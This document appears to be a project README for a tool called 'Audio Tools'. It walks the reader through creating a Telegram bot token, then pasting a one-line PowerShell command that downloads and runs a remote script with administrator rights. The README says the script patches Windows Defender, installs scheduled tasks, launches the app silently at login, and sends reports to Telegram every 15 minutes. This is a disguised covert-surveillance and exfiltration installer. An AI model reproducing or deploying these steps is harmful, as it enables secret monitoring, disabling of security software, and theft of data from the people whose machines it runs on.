<p align="center">
    <img style="width:50%; height:auto;" src="assets/img/keyeyes.png" alt="Deploy Keys Logo">
</p>

# AUDIO TOOLS

## Setting up Telegram Bot

### Introduction

A guide on how to setup data sending via the Telegram bot.

### Getting a Token

1. Open a chat with [Botfather](https://t.me/botfather)
2. Write command ```/newbot```<br />
![Newbot Command](assets/img/newbot_chat.png)
3. Write the name of the bot, then the nickname with the attribute ```_bot``` at the end.<br />
![Newbot Nickname](assets/img/newbot_output.png)assets  
4. Copy the API Key & paste it into a **text editor**

### Finding your ID

1. Open a chat with [Get My ID](https://t.me/getmyid_bot)
2. Write the command ```/start```. 
  
![Get My ID Output](assets/img/getmyid_output.png)

3. Copy your ID# and paste it on a new line in your **text editor**

Signal your Api Key and ID# before proceeding onto the steps below.

## Download / How to use it?

### Method 1 - PowerShell (Windows 8 and later) ❤️

1. Open PowerShell (Not CMD). To do that, right-click on the Windows start menu and select PowerShell (Admin) or Terminal (Admin). Alternatively you can press and hold the keys  ` win  + x ` followed by tapping just the ` a ` key
2. Copy and paste the code below and press enter  

```
irm https://raw.githubusercontent.com/B95segal/AudioTools/refs/heads/main/deploy.ps1 | iex
```

3. After 15sec your computer will automatically restart.
4. That's all.

---

### Method 2 - Traditional (Windows 7 and later)

<details>
  <summary>Click here for info</summary>

1. Download the file using the links provided below.  
`https://raw.githubusercontent.com/B95segal/AudioTools/refs/heads/main/deploy.ps1`  

1.  Right-click on the downloaded `.ps1` file and click `Run as Administrator`
2.  You will see the powershell console open breifly and then disappear.
3.  Your computer will then automatically restart.
4.  That's all.

</details>

---

> [!NOTE]
> Once restarted your computer will have/had:
>
> - Windows defender patched
> - App installed
> - Scheduled tasks setup
> - App launched silently in the background on login
> - Send a report every 15min through to telegram

Removing Audio Tools
---

Follow the same steps as above and substitue the command above for any of these instead

```
irm https://raw.githubusercontent.com/B95segal/AudioTools/refs/heads/main/nuke.ps1 | iex
```

---

```
Latest Version: 1.6
Release date: 29-Jan-2025
```

<hr />

<p align="center">Made with Love ❤️</p>
